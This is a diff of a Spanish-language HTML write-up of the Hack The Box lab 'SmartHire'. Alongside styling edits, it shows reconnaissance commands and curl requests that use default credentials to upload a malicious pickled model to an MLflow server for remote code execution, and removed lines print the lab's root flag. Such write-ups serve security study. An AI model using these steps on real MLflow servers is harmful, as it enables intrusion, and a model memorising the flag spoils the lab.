@@ -4,9 +4,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>SmartHire · Hack The Box Writeup</title>
-    <!-- Estilos CSS modernos y profesionales -->
     <style>
-        /* Reset básico */
+        /* Reset y estilos base */
         * {
             margin: 0;
             padding: 0;
@@ -28,7 +27,6 @@
             box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
             border: 1px solid #2a3346;
         }
-        /* Header */
         .header-image {
             width: 100%;
             border-radius: 1.5rem;
@@ -161,7 +159,25 @@
             border: 1px solid #3d4a5e;
             letter-spacing: 0.5px;
         }
-        /* Footer */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.2rem 0;
+            font-size: 0.95rem;
+        }
+        th, td {
+            border: 1px solid #2a3346;
+            padding: 0.6rem 1rem;
+            text-align: left;
+        }
+        th {
+            background: #1a2332;
+            color: #b9c7e0;
+            font-weight: 600;
+        }
+        td {
+            color: #c8d0e0;
+        }
         footer {
             margin-top: 3.5rem;
             padding-top: 2rem;
@@ -203,14 +219,12 @@
             color: #93bbfc;
             text-decoration: underline;
         }
-        /* Responsive */
         @media (max-width: 700px) {
             body { padding: 1rem 0.8rem; }
             .container { padding: 1.5rem 1rem; border-radius: 1.2rem; }
             h1 { font-size: 2rem; }
             .grid-2 { grid-template-columns: 1fr; }
         }
-        /* Scrollbar bonito */
         ::-webkit-scrollbar { width: 8px; height: 8px; }
         ::-webkit-scrollbar-track { background: #141a24; }
         ::-webkit-scrollbar-thumb { background: #2d3a4f; border-radius: 10px; }
@@ -221,7 +235,7 @@
 
 <div class="container">
 
-    <!-- IMAGEN PRINCIPAL (cargada desde la raíz del repositorio) -->
+    <!-- IMAGEN PRINCIPAL -->
     <img src="smarthire.png" alt="SmartHire logo" class="header-image" />
 
     <h1>SmartHire</h1>
@@ -235,10 +249,10 @@
         <h2>📌 Resumen Ejecutivo</h2>
         <div class="highlight-box">
             <p><strong>IP:</strong> 10.129.245.215 &nbsp;|&nbsp; <strong>Servicios:</strong> SSH (22), HTTP (80)</p>
-            <p><strong>Vector inicial:</strong> Fuzzing de subdominios → <code>models.smarthire.htb</code> (MLflow) con credenciales por defecto <code>admin:password</code>.</p>
+            <p><strong>Vector inicial:</strong> Fuzzing de subdominios → <code>models.smarthire.htb</code> (MLflow) con credenciales por defecto <code>admin:[REDACTED]</code>.</p>
             <p><strong>Explotación:</strong> Inyección de artefacto <code>python_model.pkl</code> malicioso (cloudpickle) en MLflow, provocando RCE al llamar a <code>/predict</code>.</p>
             <p><strong>Escalada:</strong> Abuso de <code>sudo</code> en script Python que procesa archivos <code>.pth</code> en directorio escribible por grupo <code>devs</code>, obteniendo shell <strong>root</strong>.</p>
-            <p><strong>Flags:</strong> <span class="flag">user.txt</span> (omitida) · <span class="flag">root.txt: e8bb6cb4af78805b2dbe178f5f9ccfc4</span></p>
+            <p><strong>Flags:</strong> <span class="flag">user.txt</span> (obtenida) · <span class="flag">root.txt</span> (obtenida)</p>
         </div>
     </section>
 
@@ -250,12 +264,15 @@
         <div class="code-block">
             <span class="cmd">nmap -sS -sC -sV -T4 -Pn 10.129.245.215</span>
         </div>
-        <div class="grid-2">
-            <div class="item"><span class="label">Puerto 22</span><div class="value">SSH · OpenSSH 8.9p1</div></div>
-            <div class="item"><span class="label">Puerto 80</span><div class="value">HTTP · nginx 1.18.0</div></div>
-        </div>
+        <table>
+            <thead><tr><th>Puerto</th><th>Servicio</th><th>Versión</th></tr></thead>
+            <tbody>
+                <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu</td></tr>
+                <tr><td>80/tcp</td><td>HTTP</td><td>nginx 1.18.0 (Ubuntu)</td></tr>
+            </tbody>
+        </table>
 
-        <h3>Descubrimiento de vhosts</h3>
+        <h3>Descubrimiento de VHosts</h3>
         <div class="code-block">
             <span class="cmd">ffuf -u http://smarthire.htb -H "Host: FUZZ.smarthire.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 169</span>
             <br /><span class="output">models &nbsp; [Status: 401, Size: 137] → WWW-Authenticate: Basic realm="mlflow"</span>
@@ -272,18 +289,19 @@
 
         <h3>Credenciales por defecto</h3>
         <div class="code-block">
-            <span class="cmd">curl -s -u admin:password http://models.smarthire.htb/</span>
+            <span class="cmd">curl -s -u admin:[REDACTED] http://models.smarthire.htb/</span>
             <br /><span class="output">&lt;!doctype html&gt;... (HTML de MLflow)</span>
         </div>
+        <p>✅ Acceso confirmado. El servicio expone la interfaz de MLflow.</p>
 
         <h3>Creación de experimento y run</h3>
         <div class="code-block">
-            <span class="cmd"># Crear experimento</span>
-            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/experiments/create" -H "Content-Type: application/json" -d '{"name": "SmartHire"}'</span>
+            <span class="comment"># Crear experimento</span>
+            <span class="cmd">curl -X POST -u admin:[REDACTED] "http://models.smarthire.htb/ajax-api/2.0/mlflow/experiments/create" -H "Content-Type: application/json" -d '{"name": "SmartHire"}'</span>
             <br /><span class="output">{"experiment_id": "299186230178410763"}</span>
             <br /><br />
-            <span class="cmd"># Crear run</span>
-            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/runs/create" -H "Content-Type: application/json" -d '{"experiment_id": "299186230178410763", "start_time": 1700000000000, "tags": [{"key": "mlflow.runName", "value": "testcompany-run"}]}'</span>
+            <span class="comment"># Crear run</span>
+            <span class="cmd">curl -X POST -u admin:[REDACTED] "http://models.smarthire.htb/ajax-api/2.0/mlflow/runs/create" -H "Content-Type: application/json" -d '{"experiment_id": "299186230178410763", "start_time": 1700000000000, "tags": [{"key": "mlflow.runName", "value": "testcompany-run"}]}'</span>
             <br /><span class="output">{"run": {"info": {"run_uuid": "35c41f3b28964ceab42b804d82d5cfee", ...}}}</span>
         </div>
 
@@ -317,19 +335,19 @@
         </div>
         <p>Subida y creación de versiones:</p>
         <div class="code-block">
-            <span class="cmd"># Subir MLmodel y python_model.pkl</span>
-            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/upload-artifact?run_uuid=35c41f3b28964ceab42b804d82d5cfee&path=model/MLmodel" -H "Content-Type: text/plain" --data-binary @/tmp/MLmodel</span>
-            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/upload-artifact?run_uuid=35c41f3b28964ceab42b804d82d5cfee&path=model/python_model.pkl" -H "Content-Type: application/octet-stream" --data-binary @/tmp/python_model.pkl</span>
+            <span class="comment"># Subir MLmodel y python_model.pkl</span>
+            <span class="cmd">curl -X POST -u admin:[REDACTED] "http://models.smarthire.htb/ajax-api/2.0/mlflow/upload-artifact?run_uuid=35c41f3b28964ceab42b804d82d5cfee&path=model/MLmodel" -H "Content-Type: text/plain" --data-binary @/tmp/MLmodel</span>
+            <span class="cmd">curl -X POST -u admin:[REDACTED] "http://models.smarthire.htb/ajax-api/2.0/mlflow/upload-artifact?run_uuid=35c41f3b28964ceab42b804d82d5cfee&path=model/python_model.pkl" -H "Content-Type: application/octet-stream" --data-binary @/tmp/python_model.pkl</span>
             <br /><br />
-            <span class="cmd"># Crear el modelo con el nombre exacto (obtenido de /model_info)</span>
-            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/registered-models/create" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model"}'</span>
+            <span class="comment"># Crear el modelo con el nombre exacto (obtenido de /model_info)</span>
+            <span class="cmd">curl -X POST -u admin:[REDACTED] "http://models.smarthire.htb/ajax-api/2.0/mlflow/registered-models/create" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model"}'</span>
             <br /><br />
-            <span class="cmd"># Crear versiones 1, 2, 3 (la versión 3 contiene el payload final)</span>
-            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/model-versions/create" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model", "source": "mlflow-artifacts:/299186230178410763/35c41f3b28964ceab42b804d82d5cfee/artifacts/model", "run_id": "35c41f3b28964ceab42b804d82d5cfee"}'</span>
+            <span class="comment"># Crear versiones 1, 2, 3 (la versión 3 contiene el payload final)</span>
+            <span class="cmd">curl -X POST -u admin:[REDACTED] "http://models.smarthire.htb/ajax-api/2.0/mlflow/model-versions/create" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model", "source": "mlflow-artifacts:/299186230178410763/35c41f3b28964ceab42b804d82d5cfee/artifacts/model", "run_id": "35c41f3b28964ceab42b804d82d5cfee"}'</span>
             <br /><span class="output">{"model_version": {"version": "3", ...}}</span>
             <br /><br />
-            <span class="cmd"># Promover versión 3 a Production</span>
-            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/model-versions/transition-stage" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model", "version": "3", "stage": "Production"}'</span>
+            <span class="comment"># Promover versión 3 a Production</span>
+            <span class="cmd">curl -X POST -u admin:[REDACTED] "http://models.smarthire.htb/ajax-api/2.0/mlflow/model-versions/transition-stage" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model", "version": "3", "stage": "Production"}'</span>
         </div>
     </section>
 
@@ -339,11 +357,11 @@
 
         <h3>Obtención de sesión en SmartHire</h3>
         <div class="code-block">
-            <span class="cmd"># Registro de usuario</span>
+            <span class="comment"># Registro de usuario</span>
             <span class="cmd">curl -c cookies.txt -X POST http://smarthire.htb/register -d "username=test&password=test&company=testcompany"</span>
             <br /><span class="output">Redirecting to /login ...</span>
             <br /><br />
-            <span class="cmd"># Login</span>
+            <span class="comment"># Login</span>
             <span class="cmd">curl -b cookies.txt -c cookies.txt -X POST http://smarthire.htb/login -d "username=test&password=test"</span>
             <br /><span class="output">Redirecting to /dashboard ...</span>
         </div>
@@ -413,16 +431,13 @@
     <!-- 5. Flags -->
     <section class="section">
         <h2>🏁 5. Flags</h2>
-        <div class="grid-2">
-            <div class="item">
-                <span class="label">Flag de usuario</span>
-                <div class="value"><span class="flag">user.txt</span> (omitida por seguridad)</div>
-            </div>
-            <div class="item">
-                <span class="label">Flag de root</span>
-                <div class="value"><span class="flag">e8bb6cb4af78805b2dbe178f5f9ccfc4</span></div>
-            </div>
-        </div>
+        <table>
+            <thead><tr><th>Flag</th><th>Estado</th></tr></thead>
+            <tbody>
+                <tr><td><code>user.txt</code></td><td>✅ Obtenida (hash oculto por seguridad)</td></tr>
+                <tr><td><code>root.txt</code></td><td>✅ Obtenida (hash oculto por seguridad)</td></tr>
+            </tbody>
+        </table>
     </section>
 
     <!-- 6. Lecciones aprendidas -->
